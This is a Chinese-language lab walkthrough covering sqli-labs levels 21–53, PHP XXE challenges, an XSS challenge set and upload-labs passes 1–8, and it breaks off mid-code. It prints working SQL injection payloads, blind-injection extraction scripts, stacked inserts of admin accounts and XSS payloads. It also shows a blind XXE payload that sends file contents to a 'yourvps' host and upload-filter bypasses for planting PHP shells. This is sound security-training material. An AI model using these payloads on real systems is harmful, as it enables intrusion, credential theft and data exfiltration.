level21这一关和上一关就是加了一层base64编码，所以可以直接用上面的注入编码后提交 uname=-as&#x27; union select 1,2,3# uname=LWFzJyB1bmlvbiBzZWxlY3QgMSwyLDMj 但是出现报错 uname=-as&#x27;) union select 1,2,3# uname=LWFzJykgdW5pb24gc2VsZWN0IDEsMiwzIw== 所以只要将上面的sql语句修改闭合方式再编码提交即可 level22基于错误的双引号字符型Cookie注入 这里只要将21关的双引号换成双引号，再base64编码 uname=-as&quot; union select 1,2,3# uname=LWFzIiB1bmlvbiBzZWxlY3QgMSwyLDMj uname=-ada&#x27; union select 1,group_concat(password),3 from users--+ uname=LWFkYSIgdW5pb24gc2VsZWN0IDEsZ3JvdXBfY29uY2F0KHBhc3N3b3JkKSwzIGZyb20gdXNlcnMj level23根据提示可以知道是get型注入 但是但输入 2&#x27; or 1=1 # 2&#x27; or 1=1 --+ 2&#x27; or 1=1 %23 都会出现语法错误，猜测应该是 #, --两个注释符被过滤了 里我们需要一个特殊的注释符：;%00或者and和or语句进行闭合 payload: ?id=-1&#x27; union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users ;%00 level24二次注入 二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。 二次注入，可以概括为以下两步: 第一步：插入恶意数据进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。 第二步：引用恶意数据开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。 正常用户admin可以正常登录，但是这里需要注册一个非正常的恶意用户，向数据库中插入恶意数据，来修个正常用户admin的密码 username: admin’# password: 任意 注册完后可以使用该账号登录 登录后可以更改用户的密码，此时可以随意修改密码，那么admin用户的密码就会被改成改密码 看看源码，分析原理 $sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;; $res = mysql_query($sql) or die(&#x27;You tried to be smart, Try harder!!!! :( &#x27;); 将用户名和密码带入 $sql = &quot;UPDATE users SET PASSWORD=&#x27;123456&#x27; where username=&#x27;admin&#x27; #&#x27; and password=&#x27;$curr_pass&#x27; &quot;; 可以看到真正的sql语句为 $sql = &quot;UPDATE users SET PASSWORD=&#x27;123456&#x27; where username=&#x27;admin&#x27; 这杨就导致了admin用户密码被改变。 level25这一关尝试可以发现，是将or和and替换成空 但是可以直接使用双写绕过，因为它只过滤了一次 所以还是可以使用union注入，就是要注意or和and单词需要双写。 level25a这一关和上一关一样是过滤了or和and，可以使用双写绕过，但是需要使用盲注 可以使用level8使用的脚本，对其payload稍加修改即可 import requests url = &quot;http://127.0.0.1/sqli-labs/Less-25a/?id=&quot; flag = &quot;&quot; t = &quot;&quot; sum=0 for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): # payload = &quot;1 aandnd ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.foorrmat(i,mid) # payload = &quot;1 aandnd (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from infoorrmation_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) # payload = &quot;1 aandnd (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from infoorrmation_schema.columns where table_schema=database() aandnd table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) payload = &quot;1 aandnd (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) response = requests.get(url+payload) t = response.text if &quot;Your Login name&quot; in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 # print(mid) flag = flag + chr(mid) print(flag) print(flag) level2626与上一关相比，很类似，空格，注释符和 / 也给过滤了 对于注释和结尾字符的我们此处只能利用构造一个 ‘ 来闭合后面到 ‘ ；对于空格，有较多的方法： %09 TAB键（水平） %0a 新建一行 %0c 新的一页 %0d return功能 %0b TAB键（垂直） %a0 空格(应该是php转化的时候是一个特殊字符，然后mysql会解释为空白字符) 可以使用报错注入或者盲注 payload: 0&#x27;||left(database(),1)&gt;&#x27;s&#x27;%26%26&#x27;1&#x27;=&#x27;1 0&#x27;||updatexml(1,concat(0x7e,(Select%0a@@version),0x7e),1)||&#x27;1&#x27;=&#x27;1 level26a与上一关一样，题目提示空格与注释被过滤了，可以使用%a0绕过，报错注入不出，可以用布尔盲注 0&#x27;||&#x27;1&#x27;=&#x27;1 #探测为&#x27; 0&#x27;||left(database(),1)=&#x27;s&#x27;%26%26&#x27;1&#x27;=&#x27;1 白盒审计知道是&#x27;) 0%27)%a0union%a0select%a01,database(),2||(&#x27;1 0%27)%a0union%a0select%a01,database(),2;%00 level27题目提示union与select被过滤了，但是没有使用preg_ireplace(),所以可用大小写绕过 0&#x27;||&#x27;1&#x27;=&#x27;1 0&#x27;||left(database(),1)=&#x27;s&#x27;%26%26&#x27;1&#x27;=&#x27;1 0&#x27;%0AunIon%0AselEct%0A1,group_concat(schema_name),2%0Afrom%0Ainformation_schema.schemata;%00 level27a与27关基本一样，就是在id参数位置没有使用单引号闭合 payload: 0%0AunIon%0AselEct%0A1,group_concat(schema_name),2%0Afrom%0Ainformation_schema.schemata;%00 level28union select大小写均被过滤，但是select还可单独用，盲注即可，注意这里的id闭合方式为(&#39;&#39;) 0&#x27;)||left(database(),1)&gt;&#x27;s&#x27;;%00 level28a与28关相比，简单很多，只是过滤了union select,所以可以继续使用上面的payload 0&#x27;)||left((database()),1)=&#x27;s&#x27;;%00 0&#x27;)||left((selEct%0agroup_concat(schema_name)%0afrom%0Ainformation_schema.schemata),1)&lt;&#x27;s&#x27;;%00 level29利用tomcat与apache解析相同请求参数不同的特性，tomcat解析相同请求参数取第一个，而apache取第二个，如?id=1&amp;id=2，tomcat取得1，apache取得2 ?id=1&amp;id=0&#x27; union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 level30与 29 架构一样，原理一致只不过加了&quot;限制 ?id=1&amp;id=0&quot; union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 level31架构一样，多了&quot;) ?id=1&amp;id=0&quot;) union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 level32注意是GBK，可以用%df进行宽字节注入 宽字节注入 宽字节注入利用了mysql一个特性，即当mysql在使用GBK编码的时候，会认为两个字符是一个汉字。（前一个ASCII码要大于128，才到汉字的范围） 先了解一下这些字符的url编码： 当输入单引号，经addslashes转义后，对应的url编码是：‘ –&gt; &#39; –&gt; %5C%27当在前面引入一个ASCII大于128的字符（比如%df），url编码变为：%df –&gt; %df \\ ‘ –&gt; （%df%5C）%27 若使用gbk编码的话，%df%5C会被当作一个汉字处理，从而使%27（单引号）逃出生天，成功绕过 payload: 0%df%27%20or%201=1%23 0%df&#x27; union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 level33与32相同 payload: 0%df&#x27; union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 level34这关的过滤方式和前面一样，考虑宽字节注入，但是POST传入数据时不会进行URL编码，因此这里采用将utf8单引号转为utf-16/utf-32编码绕过，即将&#39;转为utf-16为 �&#39; payload: Username: 1�&#x27; or 1=1# Password: 任意 level35GET型宽字节注入，但区别是这里是数字型，不需要用单引号闭合了，其他的和less-32一样，16进制绕过一下表名即可。 payload: ?id=-1 union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+ level36直接使用32关的payload ?id=-1%df&#x27; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+ level37和less-34一样 payload: Username: 1�&#x27; or 1=1# Password: 任意 level38堆叠注入：可以执行多条语句，用分号间隔 堆叠注入优点是可以执行的语句更加灵活，如Create、Delete、Update、Insert、Drop….，但代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，在前端界面是无法看到返回结果的 可以使用create创建一张表 1&#x27;;create table test like users;%23 也可以向数据包中插入一条数据 ?id=1&#x27;;insert into users(id,username,password) values(&#x27;20&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)--+ level39和38一样，只不过这里是数字型，无需闭合。 ?id=1;insert into users(id,username,password) values(&#x27;20&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)--+ level40闭合方式不同而已 payload ?id=1&#x27;);insert into users(id,username,password) values(&#x27;15&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)--+ level41数字型注入与39关相同 ?id=1;insert into users(id,username,password) values(&#x27;15&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)--+ level42与之前几关类似，不过这里的username位置进过滤，所以需要password位置进行堆叠注入 payload Username：usnn Password：1&#x27;;insert into users(id,username,password) values(&#x27;15&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)# 点击登录后，会发现登录失败，但是inert语句已经被执行了，可以使用admin123账号直接登录 level43与42的闭合方式不同 使用的是(&#39;&#39;) payload Username：usnn Password：1&#x27;);insert into users(id,username,password) values(&#x27;15&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)# level44与42相同 Username：usnn Password：1&#x27;;insert into users(id,username,password) values(&#x27;15&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)# level45与43相同 Username：usnn Password：1&#x27;);insert into users(id,username,password) values(&#x27;15&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)# level46order by注入 username、password均为列名，所以以下需要知道列名 ?order=if(1=1,username,password) ?order=null,if(1=1,username,password) ?order=(case when (1=1) then username else password end) ?order=ifnull(null, username) ?order=rand(1=1) //order by rand(1)/rand(0)两者返回不一样 ?order=(select 1 regexp if(1=1,1,0x00)) 将1=1换成bool盲注的语句函数即可用于获取数据sort=rand(ascii(database(),1))=115) 时间盲注 sort=1 and if(ascii(substr(database(),1,1))=116,0,sleep(5)) sort=(select if(substring(current,1,1)=char(115),benchmatrk(5000000,md5(&#x27;1&#x27;)),null) from (select database() as current) as tb1) Bool 盲注 rand(ascii(left(database()),1))=115) 报错注入： updatexml(1,if(1=1,concat(0x7e,version()),2),1) (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) procedure analyse 参数后注入 sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1) into outfile参数: id=1 into outfield &quot;path&quot; 上传网马，可以在后面加上lines terminated by 16进制转码的数据 level47与46的闭合防止不用，使用报错注入 ?sort=1&#x27; and extractvalue(1,concat(0x7e,( select concat_ws(&#x27;:&#x27;,username,password) from users limit 0,1),0x7e))--+ level48使用时间盲注 1 and If(ascii(substr(database(),1,1))&gt;115,0,sleep (5))--+ sort=rand(ascii(left(database(),1))=115) import requests url = &#x27;http://127.0.0.1/Less-48/ payloads = &#x27;QqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm&#123;&#125;,_&#x27; data = &#x27;&#x27; for i in range(50): for j in payloads: # payload = f&quot;?sort=1 and if((substr(binary database(),&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;),sleep(3),1)&quot; # payload = f&quot;?sort=1 and if((substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;),sleep(3),1)&quot; payload = f&quot;?sort=1 and if((substr((select binary group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;) ,&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;),sleep(3),1)&quot; try: r = requests.get(url+payload, timeout=1) except Exception: data += j print(data) break level49与47的闭合方式不同，但是可以使用盲注 1&#x27; and If(ascii(substr(database(),1,1))=115,0,sleep (5))--+ 1&#x27; and (If(ascii(substr((select username from users where id=1),1,1))=68,0,sleep(5)))--+ level50order by与堆叠注入结合，数字型 payload: ?sort=1;insert into users(id,username,password) values(&#x27;16&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)--+ level51与50关相比增加单引号闭合 ?sort=1;insert into users(id,username,password) values(&#x27;16&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)--+ level52与50相同 ?sort=1;insert into users(id,username,password) values(&#x27;16&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)--+ level53和51一样，只是不会回显错误，堆叠注入方式相同。 ?sort=1&#x27;;insert into users(id,username,password) values(&#x27;16&#x27;,&#x27;admin123&#x27;,&#x27;admin123&#x27;)--+ xxe挑战github地址：https://github.com/vulnspy/phpaudit-XXE/archive/master.zip 因为环境搭建比较简单就直接在windows上运行了 读取的文件也随之改变，在D盘中建立一个1.txt DOMDocument使用如下payload读取文件 &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY content SYSTEM &quot;file:///D:/1.txt&quot;&gt; ]&gt; &lt;note&gt; &lt;name&gt;&amp;content;&lt;/name&gt; &lt;/note&gt; 漏洞原因 DOmDocument类 $dom = new DOMDocument(); libxml_disable_entity_loader(false); $data = isset($_POST[&#x27;data&#x27;])?trim($_POST[&#x27;data&#x27;]):&#x27;&#x27;; $resp = &#x27;&#x27;; if($data != false)&#123; $dom = new DOMDocument(); $dom-&gt;loadXML($data, LIBXML_NOENT); ob_start(); var_dump($dom); $resp = ob_get_contents(); ob_end_clean(); &#125; SimpleXMLElement使用payload： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY content SYSTEM &quot;file:///D:/1.txt&quot;&gt; ]&gt; &lt;note&gt; &lt;name&gt;&amp;content;&lt;/name&gt; &lt;/note&gt; 漏洞代码 造成 XXE 的类是 SimpleXMLElement libxml_disable_entity_loader(false); $data = isset($_POST[&#x27;data&#x27;])?trim($_POST[&#x27;data&#x27;]):&#x27;&#x27;; $resp = &#x27;&#x27;; if($data != false)&#123; $xml = new SimpleXMLElement($data, LIBXML_NOENT); ob_start(); var_dump($xml); $resp = ob_get_contents(); ob_end_clean(); &#125; simplexml_load_stringpayload: &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY content SYSTEM &quot;file:///D:/1.txt&quot;&gt; ]&gt; &lt;note&gt; &lt;name&gt;&amp;content;&lt;/name&gt; &lt;/note&gt; 造成漏洞的是simplexml_load_string，代码如下 $data = isset($_POST[&#x27;data&#x27;])?trim($_POST[&#x27;data&#x27;]):&#x27;&#x27;; $resp = &#x27;&#x27;; if($data != false)&#123; $xml = simplexml_load_string($data, &#x27;SimpleXMLElement&#x27;, LIBXML_NOENT); ob_start(); var_dump($xml); $resp = ob_get_contents(); ob_end_clean(); &#125; BlindXXE这一关提交payload无法看到内容，但是可以看到是访问成功的 正常情况下，只会返回给我们ok，即有查询结果，但是不会告诉我们结果是什么 源码如下 &lt;?php if(isset($_GET[&#x27;s&#x27;]))&#123; show_source(__FILE__); exit; &#125; libxml_disable_entity_loader(false); $data = isset($_POST[&#x27;data&#x27;])?trim($_POST[&#x27;data&#x27;]):&#x27;&#x27;; $resp = &#x27;&#x27;; if($data != false)&#123; $xml = simplexml_load_string($data, &#x27;SimpleXMLElement&#x27;, LIBXML_NOENT); if($xml &amp;&amp; isset($xml-&gt;name))&#123; $name = $xml-&gt;name; &#125; echo isset($name)?&#x27;ok&#x27;:&#x27;error&#x27;; &#125; ?&gt; 上面的例子是因为echo htmlspecialchars($resp);这句代码所以才有回显，那么把这段代码去掉，就变成了无回显。那么，是不是就不能进行xxe了呢，答案是否定的，虽然靶机没有返回给我们数据，但是我们可以把数据带到我们自己的服务器上。 我们传入如下的payload： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE a [ &lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=D:/1.txt&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://yourvps/evil.xml&quot;&gt; %dtd; %send; ]&gt; &lt;abc&gt;&lt;/abc&gt; 然后在自己的vps上的evil.xml写入： &lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://yourvps/?content=%file;&#x27;&gt;&quot;&gt; %payload; 注意，因为这里是参数实体payload来嵌套定义参数实体send，所以被嵌套定义的参数实体%一定要HTML编码为：% 如此一来，调用的过程就变成了：参数实体dtd通过http协议来访问vps上的evil.xml，然后返回evil.xml的内容，调用了参数实体payload，然后payload又调用了参数实体send，send的作用就是把参数实体file（即文件D:/1.txt的base64编码内容）发送到我们的vps上，注意在服务器上监听 xss通关因为网上有挑战题目的网址就没在本地搭建 1最基础的xss，get提交 ?name=&lt;script&gt;alert(1)&lt;/script&gt; 2第二关直接提交会发现没有弹窗 查看源码可以看到，因为&lt;script&gt;，被包裹在input标签中无法起作用，因此需要先闭合input标签 payload &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; 3直接提交查看源码 可以发现提交后的数据经过htmlspecialchars()转化成了实体变量不在有js代码的作用，所以需要换一种方法 payload &#39;onclick&#x3D;&#39;javascript:alert(1)&#39; 再点击一次就可以过关 4这题与上面的一样只不过这次换成了双引号闭合 &quot;onclick=&#x27;javascript:alert(1)&#x27; 5提交&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; 可以发现script被换成了scr_ipt，使用&quot;onclick=&#39;javascript:alert(1)&#39;也不行 再换一种方法 6尝试了 &lt;input name=keyword value=&quot; &quot;&gt;&lt;a hr_ef=&quot;javascript:alert(1)&quot;&gt;&quot;&gt; &lt;input name=keyword value=&quot; &quot;o_nclick=&#x27;javascript:alert(1)&#x27; &quot;&gt; &lt;input name=keyword value=&quot; &quot;&lt;scr_ipt&gt; alert(1)&lt;/script&gt;&quot;&gt; 但是都不行了，尝试了看样子是过了href, onclick, script关键词，尝试大小写绕过 提交 &quot;oNclick=&#x27;javascript:alert(1)&#x27; 7提交&quot;oNclick=&#39;javascript:alert(1)&#39;,但是发现on被过滤了 直接尝试双写绕过 oonnclick=&#x27;javascript:alert(1) 8提交&quot;oNclick=&#39;javascript:alert(1)，可以发现过滤了 &quot; &lt; &gt;，而且进行了实体转换 换一种新的注入方法html字符转换绕过 java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1) 9尝试第八关使用的代码但是发现不行 但是查看源码可以发现提示你的链接不合法，那么合法的链接有什么特点呢 就是带有协议头 java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1) // http:// 10尝试了几种方法之后发现 ,没有输出点 可以发现输入点是隐藏的 使用下面代码测试以上三个哪个是可以注入的 &amp;t_link=&quot; text&quot; &amp;t_history=&quot;text&quot;&amp;t_sort=&quot;text&quot; 再构造代码 &amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(1) 11进入页面后尝试使用上一关的方法但是无效，上网查看后发现是再refere头注入 可以发现相应包中已经被注入了XSS 在抓包页面返回给浏览器，就会出现被注入的输入框 12继续抓包，这次可以发现是在UA中注入 与上一关做法相似 出现输入框点击即可 13这关是在cookie处注入，方法与之前相同 payload cookie: 原值+user=&quot; type=text onclick=&quot;alert(1) 14需要使用带XSS的图片 15直接查看源码 这里用了angularjs的ng-include，直接在包含的页面里用&lt;script&gt;触发不了，用了img标签 AngularJS ng-include 指令 ng-include 指令用于包含外部的 HTML 文件。 包含的内容将作为指定元素的子节点。 ng-include 属性的值可以是一个表达式，返回一个文件名。 默认情况下，包含的文件需要包含在同一个域名下。 &lt;element ng-include=&quot;filename&quot; onload=&quot;expression&quot; autoscroll=&quot;expression&quot; &gt;&lt;/element&gt; 遵循SOP，只好调用第一关代码。 需要单引号包裹，否则变成注释。 paload： /level15.php?src=&#x27;level1.php?name=test&lt;img src=1 onerror=alert(1)&gt;&#x27; 16测试发现过滤空格，script，/，所以使用%0d %0a做分割符绕过过滤 payload &lt;img%0Asrc=x%0Aonerror=alert(a)&gt; &lt;iframe%0asrc=x%0donmouseover=alert`1`&gt;&lt;/iframe&gt; 17查看源码找到注入位置 但是这里过滤&lt;, &gt;，使用事件触发弹窗 Payload： ?arg01=&amp;arg02= onmouseover=alert(1) 文件上传环境使用phpstudy很容易搭建 pass1直接抓包修改文件后缀名为jpg,png,gif即可 pass2查看源码 if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) 这段代码说明是对文件的MIME类型进行了过滤，直接上传 1.php 抓包后修改文件类型为 &#39;image/jpeg&#39; ,&#39;image/png&#39;,&#39;image/gif&#39;,这三个类型都为图片 抓包修改MIME即可 知识点补充： MIME类型对大小写不敏感，但是传统写法都是小写。 text/plain text/html image/jpeg image/png audio/mpeg audio/ogg audio/* video/mp4 application/* application/json application/javascript application/ecmascript application/octet-stream 更详细的解释， pass3$deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;); 只禁止了.asp,.aspx,.php,.jsp后缀文件，可以使用php3,php5,php7,phtml等等后缀名绕过 pass4.htaccess文件的作用 URL重写、自定义错误页面 MIME类型配置 访问权限控制等 主要体现在伪静态的应用 图片防盗链 自定义404错误页面 阻止/允许特定IP/IP段 目录浏览与主页 禁止访问指定文件类型 文件密码保护 &lt;FilesMatch &quot;1.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 这几句代码的意思： 通过.htaccess文件调用php解析器去解析一个文件名中只要包含”1.jpg”这个字符串的任意文件， 无论扩展名是什么(没有也行)，都以php的方式来解析 上传完.htaccess文件后直接上传一个 1.jpg即可 pass5$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; 本题与第十题完全一样，详细解答见第十题 pass6$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; 仔细查看源码会发现少了下面的这段代码 $file_ext = strtolower($file_ext); //转换为小写 这里就可以大小写绕过。将文件后缀名改为.pHp , .PHP等 pass7$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件不允许上传&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; 跟第六关对比发现少了这句话 $file_ext = trim($file_ext); //首尾去空 利用Windows系统的文件名特性。文件名最后增加空格和点，写成1.php .，这个需要用burpsuite抓包修改，上传后保存在Windows系统上的文件名最后的一个.会被去掉，实际上保存的文件名就是1.php pass8$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = 